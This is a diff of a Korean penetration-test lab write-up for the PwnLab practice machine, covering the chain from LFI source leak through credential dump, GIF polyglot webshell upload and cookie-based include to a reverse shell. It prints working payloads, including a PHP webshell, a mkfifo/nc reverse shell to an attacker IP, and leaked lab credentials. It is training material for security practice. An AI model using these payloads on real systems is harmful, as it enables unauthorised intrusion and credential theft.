@@ -10,7 +10,7 @@ tags:
   - tech/cred/reuse
   - tech/lin/suid
   - tech/lin/path-hijack
-  - tech/rce/cmd-injection
+  - tech/lin/cmd-injection
   - tech/payload/revshell
 type: machine
 platform: pg
@@ -23,32 +23,56 @@ manual_tags: true
 tech_count: 8
 ---
 
-> [!info] PwnLab
-> 192.168.248.29 · Debian 8 jessie (32비트) · Fundamental · 플래그 2개
-> `?page=php://filter` 로 소스 → MySQL 평문 크리덴셜 → 로그인 → GIF 위장 업로드 →
-> `Cookie: lang=../upload/*.gif` 로 include → www-data → 비번 재사용으로 kane →
-> SUID `msgmike` PATH 하이재킹으로 mike → SUID `msg2root` 커맨드 인젝션으로 root
+> [!info] 요약
+> 타겟 `192.168.248.29` · Debian 8 jessie(32비트) · Fundamental · 플래그 2개
+> 진입점: `?page=php://filter/...resource=config` 로 소스 유출 → MySQL 평문(base64) 자격증명 덤프 → 앱 로그인 → GIF 폴리글롯 업로드 → `Cookie: lang=../upload/*.gif` 로 두 번째 include() 실행 → www-data RCE
+> 권한상승: DB 비밀번호 재사용(`su`)으로 kane → SUID `msgmike` PATH 하이재킹으로 mike → SUID `msg2root` 커맨드 인젝션으로 root
+> 시행착오·교훈 → [[_PLAYBOOK]]
 
-## 0. 이 박스에서 배우는 것
+## Target #1 – 192.168.248.29
 
-- **같은 앱에 LFI 진입점이 두 개**다. 하나(`?page=`)는 `.php` 가 강제로 붙어 소스 읽기에만 쓸 수 있고, 다른 하나(`Cookie: lang=`)는 확장자가 안 붙어 임의 파일 실행에 쓸 수 있다. **한쪽을 찾았다고 만족하고 멈추면 셸까지 못 간다.**
-- `php://filter/convert.base64-encode/resource=` 로 PHP 소스를 그대로 빼내는 법
-- getimagesize + 확장자 화이트리스트 + Content-Type 3중 검사를 **전부 만족시키면서** PHP 를 심는 법
-- DB 에 저장된 비밀번호가 **OS 계정에 그대로 재사용**되는 패턴 — su 로 옆걸음
-- 절대경로를 안 쓴 SUID 바이너리 → PATH 하이재킹
-- `system("/bin/echo %s >> ...")` 형태의 SUID 바이너리 → 세미콜론 하나로 커맨드 인젝션
+### Initial Access – 확장자 강제 LFI 로 유출한 DB 크리덴셜을 GIF 폴리글롯 업로드와 두 번째 무방비 include() 로 체인해 RCE 획득
 
-**시험 출제 가능성** — 높다. LFI→업로드→include 체인은 OSCP 웹 파트의 정석이고, `strings` 로 SUID 바이너리를 열어 상대경로/`system()` 을 찾는 것은 리눅스 권한상승의 기본 반사다. 변형이라면 include 진입점이 쿠키가 아니라 `Accept-Language` 헤더나 세션 파일(`/var/lib/php5/sessions/sess_*`)로 바뀌는 정도.
+**Vulnerability Explanation:** 네 취약점이 순차로 체인됨.
+- `index.php?page=` 는 `include($_GET['page'].".php")` 로 `.php` 가 강제 추가돼 임의 파일 실행은 막히지만, `php://filter/convert.base64-encode/resource=config` 로 **소스 코드 유출**은 그대로 가능 — `config.php` 에서 MySQL `root:H4u%QJ_H99` 평문 노출
+- MySQL 3306 이 인터넷에 직접 노출돼 Kali 에서 바로 접속 가능. `users` 테이블 비밀번호가 해시가 아니라 **base64 인코딩**(가역)으로 저장돼 즉시 평문 복원
+- 업로드 검사가 파일명 확장자·클라이언트 `Content-Type`·`getimagesize()` 매직바이트 세 겹이지만 **셋 다 서로 다른 곳을 봄** — GIF 헤더 뒤에 PHP 태그를 붙인 폴리글롯 파일로 전부 통과
+- `index.php` 상단의 `include("lang/".$_COOKIE['lang'])` 는 `.php` 강제가 **없음** — 업로드한 파일을 `../upload/<md5>.gif` 경로로 include 시켜 임의 코드 실행
 
-## 1. 정찰
+**Vulnerability Fix:**
+- `include()` 에 사용자 입력을 직접 연결 금지. 화이트리스트 배열 매핑이나 최소한 `realpath`+prefix 검사
+- 비밀번호를 base64 가 아닌 `password_hash()`(bcrypt)로 저장, DB 계정과 OS 계정 비밀번호 공유 금지
+- MySQL 을 `127.0.0.1` 에만 바인딩(외부 인터페이스 노출 금지)
+- 업로드 파일을 웹 서버가 직접 읽는 경로 밖에 저장하고, 확장자·MIME 검사는 보조 수단으로만 취급
 
-### Nmap
+**Severity:** Critical — 무인증 상태에서 정보유출·자격증명탈취·업로드 우회가 체인돼 즉시 원격 코드 실행으로 이어짐
 
+**Steps to reproduce the attack:**
+1. `?page=php://filter/convert.base64-encode/resource=config` 로 `config.php` 소스 획득 → MySQL `root:H4u%QJ_H99`
+2. Kali 에서 3306 직접 접속, `Users.users` 테이블 덤프 → base64 비밀번호 3개 디코딩
+3. 디코딩한 비밀번호로 `login.php` 폼 로그인 성공
+4. GIF89a 매직바이트 + `<?php system($_REQUEST["c"]); ?>` 를 붙인 `sh.gif` 를 업로드(파일명 `.gif`, `Content-Type: image/gif`)
+5. `Cookie: lang=../upload/<md5(파일명)>.gif` 로 `index.php` 요청 → 업로드 파일이 include 되어 명령 실행(www-data)
+6. `mkfifo` 리버스셸로 대화형 셸 획득
+
+### Service Enumeration
+
+**Port Scan Results**
+
+| IP Address | Ports Open |
+|---|---|
+| 192.168.248.29 | TCP: 80, 111, 3306, 50118 |
+
+전체 포트 스캔 호출 — tmux pane 을 `capture-pane` 으로 뜬 것이라 프롬프트와 pty 폭(80열)에서 잘린 줄바꿈이 그대로 들어 있음:
+
+```text
+┌──(kali㉿kali)-[~/PG/PwnLab]
+└─$ cd ~/PG/PwnLab && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.
+248.29 2>&1 | tee nmap.full.txt
 ```
-# Nmap 7.98 scan initiated Thu Aug 20 17:47:24 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.29
-Nmap scan report for 192.168.248.29
-Host is up (0.084s latency).
-Not shown: 65531 closed tcp ports (reset)
+— 출처: `~/PG/PwnLab/try2_nnmap_alias_notfound.log`
+
+```text
 PORT      STATE SERVICE VERSION
 80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
 |_http-server-header: Apache/2.4.10 (Debian)
@@ -80,56 +104,53 @@ Running: Linux 3.X|4.X
 OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.10 - 4.11
 Network Distance: 4 hops
-
-TRACEROUTE (using port 143/tcp)
-HOP RTT      ADDRESS
-1   83.55 ms 192.168.45.1
-2   83.51 ms 192.168.45.254
-3   83.61 ms 192.168.251.1
-4   83.86 ms 192.168.248.29
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Aug 20 17:47:56 2026 -- 1 IP address (1 host up) scanned in 32.17 seconds
 ```
+— 출처: `~/PG/PwnLab/nmap.log`(`nmap -sCV -p- -Pn -A --min-rate 5000`)
 
-읽을 줄은 셋이다. **22 가 없다** — 셸을 잡아도 SSH 로 갈아탈 수 없고, 사용자 전환은 전부 `su` 로 해야 한다. **3306 이 외부에 열려 있다** — 웹에서 크리덴셜만 얻으면 DB 를 Kali 에서 직접 붙을 수 있다는 뜻이고, 실제로 그게 지름길이었다. **111/50118 은 rpcbind + rpc.statd** 뿐이고 NFS 는 안 뜬다(`/etc/exports` 도 비어 있었다). `mount.nfs` 가 SUID 로 있어서 잠깐 눈길이 갔지만 export 가 없으니 경로가 아니다.
+UDP top-50 은 111/udp(rpcbind) 하나뿐 — 출처: `~/PG/PwnLab/nmap.udp.log`.
 
-UDP 도 상위 50포트만 훑었다. 111/udp 하나뿐이라 여기서 더 볼 것이 없었다.
+50118/tcp 의 실체는 셸 획득 후 `ss -lntup` 으로 특정됨 — `rpc.statd`(pid 435)가 잡고 있는 **실제 리스닝 서비스**:
 
+```text
+tcp    LISTEN     0      128                    *:50118                 *:*      users:(("rpc.statd",pid=435,fd=9))
 ```
-PORT     STATE  SERVICE
-111/udp  open   rpcbind
-135/udp  closed msrpc
-1646/udp closed radacct
-1900/udp closed upnp
-2049/udp closed nfs
-```
+— 출처: `~/PG/PwnLab/harvest_root.txt` `===== LISTEN =====` 절
 
-### 웹
+`rpc.statd` 는 `-p` 없이 뜨면 부팅마다 포트를 새로 배정받으므로 다음 인스턴스에서 같은 번호일 보장은 없음 `[가정]` — 재부팅 간 대조는 관측 없음. 그럼에도 색인 `ports:` 에는 남김(리눅스 노트에서는 고포트 자동 제외가 적용되지 않고, 여기서는 프로세스까지 특정됨).
+
+111/50118 은 rpcbind + rpc.statd 뿐이고 NFS(2049)는 TCP·UDP 양쪽 다 닫혀 있으며 `/etc/exports` 도 비어 있었음 — `mount.nfs` 가 SUID 로 있어 잠깐 눈길이 갔지만 export 가 없어 경로가 아님.
+
+버전 판정 독립 근거 2개 — nmap 배너(`Apache httpd 2.4.10 (Debian)`) + 침투 후 확인한 인터프리터 버전:
+
+```text
+PHP 5.6.17-0+deb8u1 (cli) (built: Jan 15 2016 15:55:17)
+Copyright (c) 1997-2015 The PHP Group
+allow_url_fopen => On => On
+allow_url_include => Off => Off
+```
+— 출처: `~/PG/PwnLab/proof_root.txt`(root 셸에서 `php -v` · `php -i` 실행분)
+
+`OS details: Linux 3.10 - 4.11` + 침투 후 `uname -a` 로 확정: `Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux`(32비트).
 
 ![[PG-PwnLab-home.png]]
 
-`[ Home ] [ Login ] [ Upload ]` 세 링크가 전부고 각각 `?page=login`, `?page=upload` 다. 로그인 폼과 업로드는 이렇게 생겼다.
+`[ Home ] [ Login ] [ Upload ]` 세 링크가 각각 `?page=login`·`?page=upload`. `?page=<이름>` 이 파일명을 그대로 받는 구조로 보여 디렉터리 브루트포싱 없이 이 파라미터부터 팜.
 
 ![[PG-PwnLab-login.png]]
 
-업로드 페이지는 로그인 전에는 `You must be log in.` 만 뱉는다.
+업로드 페이지는 로그인 전 `You must be log in.` 만 반환.
 
 ![[PG-PwnLab-upload-denied.png]]
 
-`?page=<이름>` 이 파일명을 그대로 받는 구조로 보이므로 여기부터 판다. 디렉터리 브루트포싱은 하지 않았다 — 파라미터 자체가 이미 파일을 가리키고 있어서 그쪽이 훨씬 빠른 길이었다.
+### Initial Access – LFI 소스 유출 → DB 크리덴셜 재사용 → GIF 업로드 → 두 번째 LFI 로 RCE
 
-## 2. 취약점 분석
+`php://filter` 래퍼로 소스를 base64 로 받는다. 리소스 이름에 `.php` 를 **안 붙인 것이 요점** — `index.php` 가 include 직전에 `.php` 를 붙이므로 `resource=config` 라고 써야 최종적으로 `config.php` 가 include 됨.
 
-### 2-1. `?page=` — 확장자가 강제되는 LFI
-
-`php://filter` 래퍼로 소스를 base64 로 받아낸다.
-
-```
+```bash
 curl -s 'http://192.168.248.29/index.php?page=php://filter/convert.base64-encode/resource=config'
 ```
 
-리소스 이름에 `.php` 를 **안 붙인 것이 요점**이다. 아래 index.php 를 보면 include 직전에 `.".php"` 가 붙기 때문에, `resource=config` 라고 써야 최종적으로 `resource=config.php` 가 된다.
+`index.php` 소스 전문(디코딩):
 
 ```php
 <?php
@@ -164,13 +185,14 @@ if (isset($_COOKIE['lang']))
 </body>
 </html>
 ```
+— 출처: `~/PG/PwnLab/src_index.php`
 
 여기서 두 가지가 동시에 보인다.
 
-1. `include($_GET['page'].".php")` — `.php` 가 강제로 붙는다. `?page=/tmp/x.gif` 는 `/tmp/x.gif.php` 를 찾으므로 실패한다. 널바이트로 자르는 건 PHP 5.6 에서 안 된다(이 박스는 PHP 5.6.17). 즉 **이 진입점은 소스 읽기 전용**이다.
-2. `include("lang/".$_COOKIE['lang'])` — **확장자가 안 붙는다.** 주석이 `Not implemented yet` 이라 개발자가 잊어버린 코드처럼 보이지만 include 는 실제로 실행된다. **여기가 진짜 실행 경로다.**
+1. `include($_GET['page'].".php")` — `.php` 가 강제로 붙음. `?page=/tmp/x.gif` 는 `/tmp/x.gif.php` 를 찾으므로 실패. 널바이트로 자르는 것은 PHP 5.6 에서 불가(이 박스는 PHP 5.6.17). **이 진입점은 소스 읽기 전용.**
+2. `include("lang/".$_COOKIE['lang'])` — **확장자가 안 붙음.** 주석은 "Not implemented yet" 이지만 include 는 실제로 실행됨. **여기가 진짜 실행 경로.**
 
-`config.php` 부터 뽑는다.
+`config.php`:
 
 ```php
 <?php
@@ -180,8 +202,9 @@ $password = "H4u%QJ_H99";
 $database = "Users";
 ?>
 ```
+— 출처: `~/PG/PwnLab/src_config.php`
 
-`login.php` 도 뽑아봤는데 SQLi 는 없다. prepared statement 를 제대로 쓴다.
+`login.php` 는 prepared statement 를 제대로 씀 — SQLi 는 없음:
 
 ```php
 	$luser = $_POST['user'];
@@ -190,66 +213,20 @@ $database = "Users";
 	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
 	$stmt->bind_param('ss', $luser, $lpass);
 ```
+— 출처: `~/PG/PwnLab/src_login.php`
 
-대신 **비밀번호를 base64 로 "저장"** 한다. 해시가 아니라 인코딩이므로 DB 를 읽으면 평문이 그대로 나온다.
+대신 비밀번호를 base64 로 "저장" — 해시가 아니라 인코딩이므로 DB 를 읽으면 평문이 그대로 나옴.
 
-> [!tip] RFI 는 왜 안 되는가 — 이 박스에서 실제로 때려봤다
-> `?page=http://192.168.45.207:8000/rfitest` 를 던졌더니 include 자리에 아무것도 안 나오고,
-> **우리 HTTP 서버 로그에 요청 자체가 찍히지 않았다.** PHP 가 URL 을 fetch 하기도 전에 거절한다는 뜻이다.
-> 타겟에서 확인한 값도 일치한다 — `allow_url_fopen => On`, `allow_url_include => Off`.
-> `allow_url_fopen` 이 On 이라 `file_get_contents` 는 URL 을 읽지만, `include` 는 별도 스위치가 막는다.
-> 그래서 `data://` 나 `http://` 로 한 방에 끝내는 길은 이 박스에 없고, **파일을 먼저 올려야** 한다.
-
-### 2-2. 업로드 검사 세 겹
-
-```php
-		$filename  = $_FILES['file']['name'];
-		$filetype  = $_FILES['file']['type'];
-		$uploaddir = 'upload/';
-		$file_ext  = strrchr($filename, '.');
-		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
-		$whitelist = array(".jpg",".jpeg",".gif",".png"); 
-
-		if (!(in_array($file_ext, $whitelist))) {
-			die('Not allowed extension, please upload images only.');
-		}
-
-		if(strpos($filetype,'image') === false) {
-			die('Error 001');
-		}
-
-		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
-			die('Error 002');
-		}
-
-		if(substr_count($filetype, '/')>1){
-			die('Error 003');
-		}
-
-		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
-```
-
-세 검사가 각각 무엇을 보는지 갈라서 봐야 우회가 보인다.
-
-| 검사 | 보는 것 | 우회 |
-|---|---|---|
-| `strrchr($filename,'.')` 화이트리스트 | **파일명의 마지막 점 이후** | 파일명을 `sh.gif` 로 |
-| `strpos($filetype,'image')` | **클라이언트가 보낸 Content-Type** | 우리가 정하는 값이라 그냥 `image/gif` |
-| `getimagesize()['mime']` | **파일 내용의 매직바이트** | 앞에 GIF 헤더를 붙임 |
-
-PHP 인터프리터는 파일 앞쪽 쓰레기를 무시하고 `<?php` 부터 실행하므로, **GIF 헤더 + PHP 태그**면 세 검사를 전부 통과하면서 실행도 된다. 확장자가 `.gif` 로 남는 것은 문제가 안 된다 — Apache 는 `.gif` 를 PHP 로 실행하지 않지만, 우리는 **직접 요청하는 게 아니라 include 로 읽힐 것**이기 때문이다. `include` 는 확장자를 보지 않는다.
-
-저장 이름이 `md5(basename(원래이름))` 이라 경로를 예측할 수 있다. 응답에도 `<img src="upload/...">` 로 그대로 돌려준다.
-
-## 3. Foothold
-
-### DB 에서 비밀번호 꺼내기
+> [!tip] RFI 는 왜 안 되는가 — 실제로 때려봤다
+> `?page=http://192.168.45.207:8000/rfitest` 를 던졌으나 include 자리에 아무것도 안 나왔고, Kali HTTP 서버 로그에 요청 자체가 안 찍혔음(출처: `~/PG/PwnLab/try5_rfi_blocked.log` — 캡처된 것은 게이트를 통과한 뒤 되돌아온 `index.php` 정적 부분뿐).
+> 타겟에서 확인한 값도 일치: `allow_url_fopen => On`, `allow_url_include => Off`(위 버전 근거 블록). `allow_url_fopen` 이 On 이라 `file_get_contents` 는 URL 을 읽지만 `include` 는 별도 스위치가 막음. 파일을 먼저 올려야 하는 이유.
 
 3306 이 외부에 열려 있으므로 Kali 에서 바로 붙는다.
 
+```bash
+mysql --skip-ssl -h 192.168.248.29 -u root -p'H4u%QJ_H99' -e 'show databases; use Users; show tables; select * from users;'
 ```
-┌──(kali㉿kali)-[~/PG/PwnLab]
-└─$ mysql --skip-ssl -h 192.168.248.29 -u root -p'H4u%QJ_H99' -e 'show databases; use Users; show tables; select * from users;'
+```text
 Database
 information_schema
 Users
@@ -260,33 +237,51 @@ kent	Sld6WHVCSkpOeQ==
 mike	U0lmZHNURW42SQ==
 kane	aVN2NVltMkdSbw==
 ```
+— 출처: `~/PG/PwnLab/mysql_dump.txt`
 
-`--skip-ssl` 이 없으면 Kali 의 MariaDB 클라이언트가 `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it` 로 죽는다(6장 참고).
+`--skip-ssl` 이 필요한 이유는 시행착오로 밝혀졌다 — [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] 참고. Kali 의 MariaDB 클라이언트(11.8.3-MariaDB, client 15.2)가 기본으로 TLS 를 요구하는데 MySQL 5.5 는 그걸 못 한다.
 
-```
+```text
 Sld6WHVCSkpOeQ== -> JWzXuBJJNy
 U0lmZHNURW42SQ== -> SIfdsTEn6I
 aVN2NVltMkdSbw== -> iSv5Ym2GRo
 ```
+— 출처: `~/PG/PwnLab/creds.txt`
 
-DB 를 못 붙는 상황이었다면 `?page=php://filter/...resource=config` 로 얻은 크리덴셜을 그대로 쓸 데가 없었을 것이다. 그때는 LFI 로 `/var/lib/mysql` 을 읽거나, 로그인 폼에 대해 위 세 비밀번호를 시도했을 것이다.
+GIF89a 매직바이트 + PHP 웹셸을 붙인 폴리글롯을 만든다.
 
-### 로그인 → 업로드
-
+```bash
+printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff' > sh.gif
+echo '<?php system($_REQUEST["c"]); ?>' >> sh.gif
 ```
-┌──(kali㉿kali)-[~/PG/PwnLab]
-└─$ printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff' > sh.gif
-└─$ echo '<?php system($_REQUEST["c"]); ?>' >> sh.gif
-└─$ xxd sh.gif | head -3
+```text
 00000000: 4749 4638 3961 0100 0100 8000 0000 0000  GIF89a..........
 00000010: ffff ff3c 3f70 6870 2073 7973 7465 6d28  ...<?php system(
 00000020: 245f 5245 5155 4553 545b 2263 225d 293b  $_REQUEST["c"]);
+00000030: 203f 3e0a                                 ?>.
 ```
+— 출처: `~/PG/PwnLab/sh.gif`(52바이트 전량)
 
-`GIF89a` 뒤의 바이트는 논리 화면 기술자(가로 1, 세로 1, 색상 정보)다. `getimagesize()` 가 크기를 읽어야 하므로 `GIF89a;` 만 붙이는 것보다 이쪽이 안전하다.
+`GIF89a` 뒤 바이트는 논리 화면 기술자(가로 1·세로 1·색상정보)다. `getimagesize()` 가 크기를 읽어야 하므로 `GIF89a;` 만 붙이는 것보다 안전하다.
 
+`upload.php` 의 검사는 네 겹인데 **서로 다른 곳을 보므로** 따로 만족시키면 됨.
+
+| 검사 | 보는 것 | 실패 시 | 우회 |
+|---|---|---|---|
+| `strrchr($filename,'.')` 가 `array(".jpg",".jpeg",".gif",".png")` 에 있는가 | 파일명의 마지막 점 이후(점 포함) | `Not allowed extension...` | 파일명을 `sh.gif` 로 |
+| `strpos($filetype,'image') !== false` | 클라이언트가 보낸 `Content-Type` | `Error 001` | 우리가 정하는 값이라 `image/gif` |
+| `getimagesize()['mime']` 가 gif/jpeg/jpg/png 인가 | 파일 내용의 매직바이트 | `Error 002` | GIF 헤더를 앞에 붙임 |
+| `substr_count($filetype,'/') > 1` | `Content-Type` 의 슬래시 개수 | `Error 003` | `image/gif` 는 슬래시 1개라 그대로 통과 |
+— 출처: `~/PG/PwnLab/src_upload.php`
+
+저장 경로는 `$uploaddir . md5(basename($_FILES['file']['name'])) . $file_ext` — **원본 파일명의 md5 + 원래 확장자**라 업로드 전에 이름을 계산할 수 있음.
+
+로그인 → 업로드:
+
+```bash
+curl -s -c cookies.txt -d 'user=kent&pass=JWzXuBJJNy&submit=Login' 'http://192.168.248.29/index.php?page=login' -i
 ```
-└─$ curl -s -c cookies.txt -d 'user=kent&pass=JWzXuBJJNy&submit=Login' 'http://192.168.248.29/index.php?page=login' -i | head -12
+```text
 HTTP/1.1 302 Found
 Date: Thu, 20 Aug 2026 08:38:44 GMT
 Server: Apache/2.4.10 (Debian)
@@ -298,29 +293,33 @@ Location: ?page=upload
 Content-Length: 265
 Content-Type: text/html; charset=UTF-8
 ```
+— 응답 헤더 자체는 파일로 저장하지 않았고 세션 쿠키만 `~/PG/PwnLab/cookies.txt` 에 남음(값 `PHPSESSID=8a228r4sf2muih5e37huv72r16` 일치). 헤더의 `Date: 08:38:44 GMT`(=17:38:44 KST)가 그 파일의 mtime `17:38:43` 과 1초 안에서 맞음.
 
-`302` + `Location: ?page=upload` 가 로그인 성공 신호다. 실패하면 200 에 `Login failed.` 가 찍힌다.
+302 + `Location: ?page=upload` 가 로그인 성공 신호. 실패 시 200 에 `Login failed.`
 
+```bash
+curl -s -b cookies.txt -F 'file=@sh.gif;type=image/gif' -F 'submit=Upload' 'http://192.168.248.29/index.php?page=upload'
 ```
-└─$ curl -s -b cookies.txt -F 'file=@sh.gif;type=image/gif' -F 'submit=Upload' 'http://192.168.248.29/index.php?page=upload' | grep -o 'upload/[a-f0-9]*\.gif'
-upload/63f0276ffd69eb424bf6093795ac9850.gif
+```html
+<img src="upload/63f0276ffd69eb424bf6093795ac9850.gif"><br />
 ```
+— 출처: `~/PG/PwnLab/upload_resp.html`. 저장 이름은 `md5(basename(원래이름))+확장자` 라 예측 가능.
 
-`-F 'file=@sh.gif;type=image/gif'` 의 `;type=` 이 파트의 Content-Type 을 지정하는 부분이다. 타겟이 아니라 Kali 의 로컬 리스너(`nc`)에 같은 요청을 던져 확인했다 — `;type=` 을 빼도 curl 이 확장자를 보고 `Content-Type: image/gif` 를 스스로 채운다. 아래는 nc 가 받은 요청에서 `Content-Type` 두 줄만 뽑은 것이다(바깥은 multipart 전체, 안쪽이 파트별).
+`;type=` 이 없어도 curl 은 `.gif` 확장자를 보고 자동으로 `Content-Type: image/gif` 를 채움. Kali 로컬 nc 리스너로 확인한 결과(바깥이 multipart 전체, 안쪽이 파트별):
 
-```
-┌──(kali㉿kali)-[~/PG/PwnLab]
-└─$ curl -s -m 3 -F 'file=@sh.gif' http://127.0.0.1:9099/     # nc 로 받아서 grep
-Content-Type: multipart/form-data; boundary=------------------------PPRLaIYrEwIPNwrz95E4JB
+```text
+Content-Type: multipart/form-data; boundary=------------------------wA4WtwC7FPzt6Po9FnsShJ
 Content-Type: image/gif
 ```
 
-즉 이 박스에서는 `;type=` 이 없어도 통과했을 것이다. 하지만 확장자를 `.php` 로 두면서 Content-Type 만 `image/*` 로 속이는 상황에서는 명시가 필수라 습관으로 붙여두는 편이 낫다.
+즉 이 박스에서는 `;type=` 이 없어도 통과했을 것. 다만 확장자를 `.php` 로 두고 Content-Type 만 속이는 상황에서는 명시가 필수라 습관으로 붙임.
 
-### include 로 실행
+`../upload/<md5>.gif` 로 두 번째 include 를 실행한다. `../` 는 include 가 `lang/` 을 앞에 붙이기 때문에 필요 — `lang/../upload/...` 로 웹루트로 되돌아옴.
 
+```bash
+curl -s -i -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' --get --data-urlencode 'c=id; uname -a; ls -la /home' 'http://192.168.248.29/'
 ```
-└─$ curl -s -i -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' --get --data-urlencode 'c=id; uname -a; ls -la /home' 'http://192.168.248.29/'
+```text
 HTTP/1.1 200 OK
 Date: Thu, 20 Aug 2026 08:39:05 GMT
 Server: Apache/2.4.10 (Debian)
@@ -339,21 +338,22 @@ drwxr-x---  2 kent kent 4096 Mar  3  2020 kent
 drwxr-x---  2 mike mike 4096 Mar  3  2020 mike
 <html>^M
 ```
+— **이 curl 응답은 파일로 저장하지 않았음.** 위 블록은 실행 당시 터미널에서 옮겨 적은 것이고, 뒷받침 근거 셋: ① `uid=33(www-data)`·`uname` 문자열과 `/home` 목록(`total 24` 이하 6줄)이 `~/PG/PwnLab/harvest_www-data.txt` 의 `-- homes --` 절과 한 글자도 다르지 않음 ② 헤더의 `Date: 08:39:05 GMT` 가 그 harvest 파일이 기록한 `Thu Aug 20 08:40:34 UTC 2026` 보다 89초 앞섬(작업 순서와 일치) ③ 리버스셸 로그가 같은 www-data 로 붙음.
 
-`../` 는 include 가 `lang/` 을 앞에 붙이기 때문에 필요하다 — `lang/../upload/...` 로 웹루트로 되돌아온다. 응답 맨 앞에 `GIF89a` 매직바이트가 그대로 찍히는 게 우리가 심은 파일이 실행됐다는 증거다. `--data-urlencode` 는 명령에 들어간 공백·세미콜론이 URL 에서 깨지지 않게 한다.
+응답 맨 앞의 `GIF89a` 매직바이트가 그대로 찍힌 것이 심은 파일이 실행됐다는 증거. 뒤의 `<html>^M` 은 include 가 끝나고 `index.php` 본문이 이어진 부분.
 
-### 리버스셸
+웹셸로 읽은 플래그는 OSCP 에서 0점이므로 바로 대화형 셸로 전환. 리스너는 tmux 안에 둔다.
 
-**웹셸로 읽은 플래그는 OSCP 에서 0점**이므로 여기서 바로 대화형 셸로 갈아탄다. 리스너는 tmux 안에 둔다.
-
+```bash
+ssh kali@10.44.44.128 "tmux new-session -d -s pwnlab_shell 'rlwrap nc -lvnp 443 2>&1 | tee ~/PG/PwnLab/shell_www-data.log; exec bash'"
+curl -s -m 10 -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' \
+  --get --data-urlencode 'c=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.207 443 >/tmp/f' \
+  'http://192.168.248.29/'
 ```
-└─$ ssh kali@10.44.44.128 "tmux new-session -d -s pwnlab_shell 'rlwrap nc -lvnp 443 2>&1 | tee ~/PG/PwnLab/shell_www-data.log; exec bash'"
-└─$ curl -s -m 10 -H 'Cookie: lang=../upload/63f0276ffd69eb424bf6093795ac9850.gif' \
-     --get --data-urlencode 'c=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.207 443 >/tmp/f' \
-     'http://192.168.248.29/'
-```
 
-```
+아래는 리스너가 받은 스트림 원문(`rlwrap nc -lvnp 443 | tee ~/PG/PwnLab/shell_www-data.log`). 타겟 pty 프롬프트가 그대로 들어 있음 — 이후 인용하는 `*@pwnlab:*` 블록은 전부 이 파일에서 옴:
+
+```text
 listening on [any] 443 ...
 connect to [192.168.45.207] from (UNKNOWN) [192.168.248.29] 43985
 /bin/sh: 0: can't access tty; job control turned off
@@ -364,76 +364,29 @@ GOT
 DONE
 ```
 
-443 아웃바운드가 첫 시도에 통과했다. `-m 10` 은 curl 이 셸 프로세스를 붙든 채 무한 대기하지 않게 하는 안전장치다.
+443 아웃바운드가 첫 시도에 통과했다(`-m 10` 은 curl 이 무한 대기하지 않게 하는 안전장치). 22 포트가 없어 SSH 로 갈아탈 수 없고, 이후 계정 전환은 전부 `su` 로 한다.
 
-`$ ` 다음에 곧바로 `www-data@pwnlab:...$` 가 붙어 있는 건, 그 자리에서 `python -c "import pty;pty.spawn('/bin/bash')"` 를 보냈는데 **`sh` 가 입력을 에코하지 않아** 명령 자체는 캡처에 안 남고 프롬프트 변화만 남았기 때문이다. `can't access tty` 상태에서는 `su` 가 비밀번호를 못 읽으므로, pty 를 먼저 올려두는 것이 4-2의 전제가 된다(정확한 거부 문구는 확인하지 않았다).
+**Local.txt value:**
+`e7fb032dc3da97822fc7dc2d65ffcc18`
 
-## 4. 권한상승
+유보 — www-data RCE 만으로는 이 값을 읽을 수 없음. `/home/kane/local.txt` 가 `drwxr-x---` 안에 있어, DB 비밀번호 재사용으로 kane 계정까지 승격한 뒤에야 확인됨(Privilege Escalation 1단계). 표준 위치를 지키기 위해 값만 여기 제시함.
 
-### 4-1. www-data 시점의 열거 — 그리고 그 한계
+### Privilege Escalation – MySQL 자격증명의 OS 계정 재사용 (www-data → kane)
 
-셸 직후 `harvest.sh` 를 돌렸다(19섹션, 889행). 읽을 부분만 옮긴다.
+**Vulnerability Explanation:** MySQL `users` 테이블에서 base64 로 복원한 비밀번호가 `su` 로 로컬 계정 인증에도 그대로 통함. 앱 계정과 OS 계정이 같은 값을 공유함.
 
-```
-===== SUDO =====
-/tmp/h.sh: 30: /tmp/h.sh: sudo: not found
-(sudo -n 실패 — 비밀번호 필요하거나 sudo 없음)
-```
+**Vulnerability Fix:** 애플리케이션 계정과 OS 계정의 비밀번호를 절대 공유하지 않는다. 공유가 불가피하면 최소한 애플리케이션 쪽을 단방향 해시로 저장해 값 복원 자체를 막는다.
 
-`sudo` 가 **아예 설치돼 있지 않다**(`which sudo` 도 빈손이었다). Debian 8 최소 설치의 기본 상태다. `sudo -l` 이 첫 수인 습관 때문에 여기서 잠깐 멈칫하게 되는데, 없는 것도 정보다 — sudo 경로는 접어도 된다.
+**Severity:** Medium — 코드 실행은 이미 확보된 상태에서 자격증명 재사용으로 명명된 로컬 계정(kane)을 획득. user 플래그 도달
 
-```
-===== SUID =====
-/bin/mount
-/bin/su
-/bin/umount
-/sbin/mount.nfs
